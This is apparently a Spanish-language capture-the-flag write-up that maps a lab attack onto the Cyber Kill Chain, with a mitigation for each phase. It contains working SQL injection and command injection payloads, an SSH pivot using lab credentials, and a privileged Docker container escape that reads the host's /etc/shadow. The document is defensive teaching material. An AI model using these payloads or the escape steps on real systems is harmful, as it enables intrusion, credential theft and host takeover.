# Kill Chain — Jump Force CTF

## Modelo: Cyber Kill Chain (Lockheed Martin)

La Cyber Kill Chain es un modelo desarrollado por Lockheed Martin que describe las fases de un ataque informático. Entender en qué fase está el atacante permite a los defensores detectar y cortar el ataque lo antes posible.

---

## Diagrama completo

```
[Reconocimiento]
 nmap → puerto 5000 (Apache)
 gobuster → /password.php, /backup.php, /index.html.bak
         │
         ▼
[Preparación del arma]
 SQL Injection payload (UNION-based)
 Command Injection payload (separador ;)
         │
         ▼
[Entrega]
 HTTP GET → password.php?id=[payload]
 HTTP POST → backup.php con command1=[payload]
         │
         ▼
[Explotación]
 SQL Injection → FLAG 1 + credenciales pablo:tefeme!.
 Command Injection → RCE como www-data en contenedor uno
         │
         ▼
[Instalación / Pivoting]
 SSH pablo@dos:2222 (red interna Docker)
 → FLAG 2: /home/pablo/.flag.txt
         │
         ▼
[C&C + Objetivo final]
 Sesión SSH interactiva en contenedor dos
 privileged: true → mount /dev/sda1 → acceso al host
```

---

## Fase 1 — Reconnaissance (Reconocimiento)

**Objetivo del atacante:** identificar qué está expuesto y qué tecnologías usa el objetivo.

**Acciones:**

```bash
# Escaneo de puertos
nmap -sV -sC -p- localhost

# Enumeración de directorios web
gobuster dir -u http://localhost:5000 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,bak
```

**Hallazgos:**
- Puerto 80/tcp con Apache 2.4 (Debian)
- Páginas PHP: `index.php`, `password.php`, `backup.php`
- Fichero de backup accesible: `index.html.bak`
- `index.php` revela explícitamente que hay múltiples vulnerabilidades

**Concepto de seguridad:** los ficheros `.bak` en el directorio web y los mensajes de debug visibles son ejemplos de **information disclosure** (OWASP A05 — Security Misconfiguration). Le dan ventaja al atacante sin que haya atacado nada todavía.

**Cómo cortarlo aquí:** monitorizar escaneos de puertos con IDS (Snort, Suricata). Bloquear agentes de gobuster en el WAF.

---

## Fase 2 — Weaponization (Preparación del arma)

**Objetivo del atacante:** preparar los payloads de ataque en base a lo descubierto.

**Vulnerabilidades identificadas:**

**SQL Injection** (`password.php`):
```php
// Código vulnerable
"select id,frase from frases where id = '$id';"
// Payload para extraer credenciales
1' UNION SELECT user,pass FROM users-- -
// Payload para extraer la flag
1' UNION SELECT flag_number,flag_value FROM flags-- -
```

**Command Injection** (`backup.php`):
```php
// Código vulnerable
shell_exec('echo ' . $c1 . ' + ' . $c2 . ' | bc')
// Payload para ejecutar comandos
command1 = 1; id
command1 = 1; cat /etc/passwd
command1 = 1; ssh pablo@dos -p 2222
```

**Cómo cortarlo aquí:** análisis estático de código (SAST) en el pipeline de CI/CD detectaría estas vulnerabilidades antes de desplegar.

---

## Fase 3 — Delivery (Entrega)

**Objetivo del atacante:** enviar el ataque al objetivo.

**Vector de entrega:** HTTP directo al servidor web en `http://localhost:5000`

- SQL Injection: parámetro `id` vía GET en `password.php`
- Command Injection: parámetros `command1`/`command2` vía POST en `backup.php`

**Sin autenticación previa.** Los formularios son públicos.

**Cómo cortarlo aquí:** WAF con reglas para detectar UNION, SELECT, comillas simples en parámetros y caracteres de shell (`;`, `|`, `&`).

---

## Fase 4 — Exploitation (Explotación)

**Objetivo del atacante:** ejecutar el ataque y obtener acceso o datos sensibles.

### 4.1 SQL Injection — extracción de datos

Navegando a `http://localhost:5000/password.php`:

```
# Confirmar inyección
id = 1'

# Contar columnas
id = 1' ORDER BY 2-- -

# Extraer flag
id = 1' UNION SELECT flag_number,flag_value FROM flags-- -
```

**FLAG 1 obtenida:** `003d873449f8e8ff13b72f2061bfbaa4e5a84b82`

```
# Extraer credenciales
id = 1' UNION SELECT user,pass FROM users-- -
```

**Credenciales obtenidas:** `pablo:tefeme!.` (entre otras)

### 4.2 Command Injection — RCE confirmado

Navegando a `http://localhost:5000/backup.php`:

```
Respuesta: Y
Numero 1: 1; id
Numero 2: 1
```

Resultado: `uid=33(www-data)` — ejecución confirmada como `www-data`.

**Cómo cortarlo aquí:** IDS/WAF detectando patrones UNION y comandos shell. Logs de Apache con los payloads. Alertas por volumen de errores SQL.

---

## Fase 5 — Installation (Persistencia y pivoting)

**Objetivo del atacante:** mantener acceso y moverse lateralmente hacia otros sistemas.

El contenedor `dos` solo acepta conexiones SSH (puerto 2222) desde la red interna de Docker. No está expuesto al exterior. El atacante usa el RCE del contenedor `uno` como puente.

```bash
# Desde el contenedor uno (via Command Injection o reverse shell)
ssh -o StrictHostKeyChecking=no pablo@dos -p 2222
# Password: tefeme!.
```

**Concepto — Segmentación de red fallida:** aunque `dos` no está expuesto directamente, la red Docker plana permite que `uno` (comprometido) lo alcance. La mitigación es crear redes Docker separadas y usar reglas explícitas de acceso.

**Cómo cortarlo aquí:** segmentar la red Docker (dos redes distintas con gateway controlado). Monitorizar conexiones SSH internas inesperadas.

---

## Fase 6 — Command & Control (C2)

**Objetivo del atacante:** establecer un canal de control estable sobre el sistema comprometido.

La sesión SSH interactiva como `pablo` en el contenedor `dos` es el canal de C2. El atacante puede:

- Explorar el sistema (`ls`, `id`, `whoami`)
- Leer ficheros accesibles
- Intentar escalar privilegios
- Establecer persistencia (clave SSH en `authorized_keys`)

**Cómo cortarlo aquí:** SIEM con alertas de sesiones SSH desde IPs internas no habituales. Auditoría de comandos ejecutados (`auditd`).

---

## Fase 7 — Actions on Objectives (Objetivo final)

**Objetivo del atacante:** completar la misión — obtener la flag de usuario y demostrar el escape de contenedor.

### 7.1 Flag de usuario

```bash
pablo@dos:~$ cat .flag.txt
```

**FLAG 2 obtenida:** `4d8c72671245d9d1b8e03a826db9d5ecead28c8c`

### 7.2 Escape de contenedor privilegiado (demostración conceptual)

El contenedor `dos` arranca con `privileged: true` en el docker-compose. Esto concede al proceso root dentro del contenedor acceso completo a todos los dispositivos del host.

Si el atacante escala a root dentro del contenedor, puede:

```bash
# Ver discos del host desde dentro del contenedor
fdisk -l
# → /dev/sda  (disco del host físico)

# Montar el sistema de ficheros del host
mkdir /tmp/host
mount /dev/sda1 /tmp/host

# Acceder al host completo
ls /tmp/host/etc/
cat /tmp/host/etc/shadow    # hashes del host real

# Entrar en el host con chroot
chroot /tmp/host
whoami  # root (del host)
```

**Impacto real:** el atacante tiene control total del host que ejecuta Docker. Puede comprometer todos los contenedores del host, instalar backdoors persistentes, exfiltrar datos de todos los sistemas, etc.

**Cómo cortarlo aquí:**
- Eliminar `privileged: true`. No hay caso de uso legítimo para la mayoría de aplicaciones.
- Usar `--cap-add` solo con las capacidades mínimas necesarias.
- Activar AppArmor o SELinux para confinar los contenedores.
- Usar `--security-opt no-new-privileges`.

---

## Tabla de mitigaciones

| Fase Kill Chain | Vulnerabilidad | Mitigación |
|---|---|---|
| Reconnaissance | Ficheros `.bak` expuestos | Nunca servir ficheros de backup desde el webroot |
| Exploitation | SQL Injection | Consultas parametrizadas (PDO prepared statements) |
| Exploitation | Command Injection | No usar `shell_exec()` con entrada del usuario |
| Exploitation | Credenciales en texto claro en BD | Hashear con bcrypt/argon2 |
| Installation | Red Docker plana | Redes Docker separadas + políticas de acceso explícitas |
| Actions | `privileged: true` | Eliminar; usar `--cap-add` con principio de mínimo privilegio |

---

## Referencias

| Concepto | Referencia |
|---|---|
| SQL Injection | OWASP A03:2021, CWE-89 |
| Command Injection | OWASP A03:2021, CWE-78 |
| Privileged Container | CWE-250 (Execution with Unnecessary Privileges) |
| Information Disclosure | OWASP A05:2021, CWE-200 |
| Segmentación de red | NIST SP 800-125B (Secure Virtual Network Configuration) |
